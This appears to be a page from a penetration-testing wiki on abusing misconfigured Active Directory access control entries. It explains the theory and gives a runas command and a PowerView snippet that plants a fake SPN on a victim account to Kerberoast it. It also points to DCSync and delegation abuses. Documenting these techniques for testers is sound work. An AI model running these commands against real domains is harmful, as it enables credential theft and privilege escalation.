# Access Control Entries \(ACEs\)

## Theory

Access privileges for resources in Active Directory Domain Services are usually granted through the use of an Access Control Entry \(ACE\). Access Control Entries describe the allowed and denied permissions for a principal in Active Directory against a securable object \(user, group, computer, container, organization unit \(OU\), GPO and so on\)

DACLs \(Active Directory Discretionary Access Control Lists\) are lists made of ACEs \(Access Control Entries\).

When misconfigured, ACEs can be abused to operate lateral movement or privilege escalation within an AD domain.

## Practice

### Requirements

The attacker needs to be in control of the object the ACE is set on to abuse it and possibly gain control over what this ACE applies to. The following abuses can only be carried out when running commands as the user the ACE is set on.

{% tabs %}
{% tab title="RunAs" %}
RunAs is a standard command that allows to execute a program under a different user account. When stuffing an Active Directory account's password, the `/netonly` flag must be set to indicate the credentials are to be used for remote access only.

```bash
runas /netonly /user:$DOMAIN\$USER "powershell.exe"
```

Since the password cannot be supplied as an argument, the session must be interactive.
{% endtab %}

{% tab title="PowerView" %}
Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Credential`, `-Domain` and `-Server` parameters that can be used to explicitly specify the user to run as, the target Domain and and the target Domain Controller. This can be useful when trying to this from a Windows system that isn't enrolled in the AD domain.

Here is an example for [targeted Kerberoasting](targeted-kerberoasting.md).

```bash
$SecPassword = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $SecPassword)
Set-DomainObject -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' -Identity 'victimuser' -Set @{serviceprincipalname='nonexistant/BLAHBLAH'}
$User = Get-DomainUser -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' 'victimuser'
$User | Get-DomainSPNTicket -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' | fl
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**Windows or UNIX ?**

All abuses below can be carried out on a Windows system that doesn't even have to be joined to the domain. On UNIX-like systems, a few of the following abuses can be carried out with tools like [aclpwn](https://github.com/fox-it/aclpwn.py) and [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py). I personally find it way easier to abuse ACEs from a Windows machine.
{% endhint %}

### Exploitation paths

In order to navigate the notes, testers can use the mindmap below.

![](../../../.gitbook/assets/abusing-aces.png)

All of the aforementioned attacks \(red blocks\) are detailed in the child notes, except:

* **Kerberos RBCD**: see [ADDS &gt; Movement &gt; Kerberos &gt; Kerberos Delegations &gt; RBCD](../abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd)
* **GPO abuses**: see [ADDS &gt; Movement &gt; GPOs](../abusing-gpos.md)
* **DCSync** : see [ADDS &gt; Movement &gt; Credential &gt; Dumping &gt; DCSync](../credentials/dumping/dcsync.md)

## Resources

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces\#genericall-on-user" caption="" %}

{% embed url="https://wald0.com/?p=112" caption="" %}

{% embed url="http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm" %}

{% embed url="https://adsecurity.org/?p=3658" %}





